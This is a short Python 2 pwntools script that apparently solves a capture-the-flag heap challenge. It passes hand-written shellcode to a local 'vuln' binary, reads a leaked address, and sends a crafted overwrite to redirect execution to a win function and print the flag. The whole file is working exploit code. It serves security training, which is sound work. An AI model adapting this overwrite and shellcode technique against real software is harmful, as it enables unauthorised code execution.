#! /usr/bin/env python2

from pwn import *

context.log_level = logging.CRITICAL

#This solution is nearly identical to the secondlife solution with two changes:
#   The shellcode must be passed in as a commandline argument (meaning it cannot be dependant on the heap address)
#   The win function's address changed slightly

while True:
    try:
        shellcode = "FFFFFFFFFFFF\x68\x66\x89\x04\x08\xC3\x90"
        p = process(["./vuln", shellcode])
        p.recvuntil("\n")
        addr = int(p.recvuntil('\n'))
        overwrite = p32(0x0804d020) + p32(addr)
        print(overwrite.encode('hex'))
        p.recvuntil('an overflow will not be very useful...\n')
        p.sendline(overwrite)
        print(p.recvuntil('}'))
        p.close()
        break
    except:
        p.close()